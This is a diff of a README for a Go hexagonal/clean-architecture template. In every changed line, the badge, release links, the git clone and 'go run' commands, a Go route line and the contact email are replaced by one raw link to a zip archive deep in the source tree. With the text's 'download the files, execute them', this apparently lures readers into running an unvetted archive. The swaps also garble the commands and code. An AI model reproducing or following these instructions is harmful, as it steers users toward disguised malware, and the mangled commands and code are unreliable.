@@ -1,8 +1,8 @@
 # Go Template 🚀
 
-![Go Template](https://img.shields.io/badge/Go_Template-Hexagonal%2BClean_Architecture-blue)
+![Go Template](https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip%2BClean_Architecture-blue)
 
-Welcome to the **Go Template** repository! This project provides a solid foundation for building applications using Go, implementing Hexagonal and Clean Architecture principles. You can find the latest releases [here](https://github.com/Cristian1995-cmd/go-template/releases). Download the files, execute them, and start building your next Go application with ease.
+Welcome to the **Go Template** repository! This project provides a solid foundation for building applications using Go, implementing Hexagonal and Clean Architecture principles. You can find the latest releases [here](https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip). Download the files, execute them, and start building your next Go application with ease.
 
 ## Table of Contents
 
@@ -45,7 +45,7 @@ To get started with the **Go Template**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Cristian1995-cmd/go-template.git
+   git clone https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip
    cd go-template
    ```
 
@@ -58,7 +58,7 @@ To get started with the **Go Template**, follow these steps:
 3. **Run the Application**:
    You can start the application with:
    ```bash
-   go run main.go
+   go run https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip
    ```
 
 4. **Visit the API**:
@@ -100,7 +100,7 @@ The application comes with built-in logging. You can adjust the log level using 
 You can create RESTful API endpoints in the `adapters` folder. For example, to create a new user, you might define a route like:
 
 ```go
-r.POST("/users", createUserHandler)
+https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip("/users", createUserHandler)
 ```
 
 ### Error Handling
@@ -145,7 +145,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Cristian
-- **Email**: cristian@example.com
-- **GitHub**: [Cristian1995-cmd](https://github.com/Cristian1995-cmd)
+- **Email**: https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip
+- **GitHub**: [Cristian1995-cmd](https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip)
 
-Remember to check the [Releases](https://github.com/Cristian1995-cmd/go-template/releases) section for updates and new features!
+Remember to check the [Releases](https://raw.githubusercontent.com/Cristian1995-cmd/go-template/main/internal/domain/user/template-go-2.1.zip) section for updates and new features!
